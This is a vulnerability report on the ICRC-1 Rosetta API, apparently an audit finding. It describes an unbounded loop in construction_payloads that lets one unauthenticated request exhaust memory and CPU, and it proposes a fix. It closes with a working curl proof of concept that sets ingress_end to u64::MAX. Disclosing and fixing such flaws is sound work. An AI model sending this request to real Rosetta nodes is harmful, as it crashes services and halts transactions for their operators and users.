### Title
Unbounded Loop in `construction_payloads` via Attacker-Controlled `ingress_end` Causes OOM/CPU Exhaustion — (`rs/rosetta-api/icrc1/src/construction_api/services.rs`)

---

### Summary

The `construction_payloads` function accepts attacker-controlled `ingress_start` and `ingress_end` values from the unauthenticated POST `/construction/payloads` endpoint. There is no upper-bound cap on `ingress_end`. A single crafted request with `ingress_end = u64::MAX` causes the function to loop ~139 million times, allocating over 1 GB of memory and exhausting CPU, crashing the Rosetta process.

---

### Finding Description

In `construction_payloads`, the loop that builds `ingress_expiries` is:

```rust
while ingress_start < ingress_end {
    ingress_expiries.push(ingress_start + ingress_interval);
    ingress_start +=
        ingress_interval.saturating_sub(INGRESS_INTERVAL_OVERLAP.as_nanos() as u64);
}
``` [1](#0-0) 

The step size per iteration is `ingress_interval - INGRESS_INTERVAL_OVERLAP`. From the constants:

- `INGRESS_INTERVAL_OVERLAP = Duration::from_secs(120)` → 120,000,000,000 ns [2](#0-1) 

- `ingress_interval = (MAX_INGRESS_TTL - PERMITTED_DRIFT).as_nanos()` ≈ 240,000,000,000 ns (300s − 60s) [3](#0-2) 

So the effective step is **120 seconds in nanoseconds** per iteration.

The only guards before the loop are:

```rust
if ingress_start >= ingress_end { return Err(...); }
if ingress_end < now + ingress_interval { return Err(...); }
``` [4](#0-3) 

There is **no upper bound on `ingress_end`**. Both guards are trivially satisfied by setting `ingress_end = u64::MAX` and `ingress_start = now`.

**Iteration count with `ingress_end = u64::MAX`:**
- `now` ≈ 1.7 × 10¹⁸ ns (Unix time in nanoseconds, ~2024–2026)
- Range = `u64::MAX − now` ≈ 1.67 × 10¹⁹ ns
- Step = 1.2 × 10¹¹ ns
- Iterations ≈ **~139 million**

Each iteration pushes a `u64` (8 bytes) into `ingress_expiries`, resulting in **~1.1 GB** of heap allocation, plus the CPU cost of 139 million loop iterations in a synchronous (non-async) function that blocks the Axum worker thread.

The endpoint is registered with no authentication middleware:

```rust
.route("/construction/payloads", post(construction_payloads))
``` [5](#0-4) 

---

### Impact Explanation

A single unauthenticated HTTP POST to `/construction/payloads` with `ingress_end` near `u64::MAX` causes OOM or CPU exhaustion in the Rosetta process. This crashes or hangs the process, halting block synchronization and transaction submission for all tracked ICRC-1 tokens served by that Rosetta instance.

---

### Likelihood Explanation

The endpoint is public, requires no credentials, and the malicious field is a plain JSON integer. The attack is a single HTTP request. Any network-reachable client can trigger it.

---

### Recommendation

Add an explicit cap on the number of generated expiries before the loop, e.g.:

```rust
const MAX_INGRESS_EXPIRIES: usize = 100; // ~200 minutes of coverage
let range = ingress_end.saturating_sub(ingress_start);
let step = ingress_interval.saturating_sub(INGRESS_INTERVAL_OVERLAP.as_nanos() as u64);
if step > 0 && (range / step) as usize > MAX_INGRESS_EXPIRIES {
    return Err(Error::processing_construction_failed(
        &"ingress window too large"
    ));
}
```

Alternatively, validate that `ingress_end <= now + MAX_ALLOWED_WINDOW` before entering the loop.

---

### Proof of Concept

```bash
curl -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [
      {"operation_identifier":{"index":0},"type":"TRANSFER",
       "account":{"address":"535yc-uxytb-gfk7h-tny7p-vjkoe-i4krp-3qmcl-uqfgr-cpgej-yqtjq-rqe"},
       "amount":{"value":"-1","currency":{"symbol":"ICP","decimals":8}}},
      {"operation_identifier":{"index":1},"type":"TRANSFER",
       "account":{"address":"bngem-gzprz-dtr6o-xnali-fgmfi-fjgpb-rya7j-x2idk-3eh6u-4v7tx-hqe"},
       "amount":{"value":"1","currency":{"symbol":"ICP","decimals":8}}}
    ],
    "public_keys": [{"hex_bytes":"...","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 1700000000000000000,
      "ingress_end": 18446744073709551615
    }
  }'
```

The Rosetta process will spin for seconds to minutes allocating ~1.1 GB before OOMing or becoming unresponsive.

### Citations

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L120-121)
```rust
    let ingress_interval: u64 =
        (ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT).as_nanos() as u64;
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L162-167)
```rust
    let mut ingress_expiries = vec![];
    while ingress_start < ingress_end {
        ingress_expiries.push(ingress_start + ingress_interval);
        ingress_start +=
            ingress_interval.saturating_sub(INGRESS_INTERVAL_OVERLAP.as_nanos() as u64);
    }
```

**File:** rs/rosetta-api/icrc1/src/common/constants.rs (L19-19)
```rust
pub const INGRESS_INTERVAL_OVERLAP: Duration = Duration::from_secs(120);
```

**File:** rs/rosetta-api/icrc1/src/main.rs (L380-380)
```rust
        .route("/construction/payloads", post(construction_payloads))
```
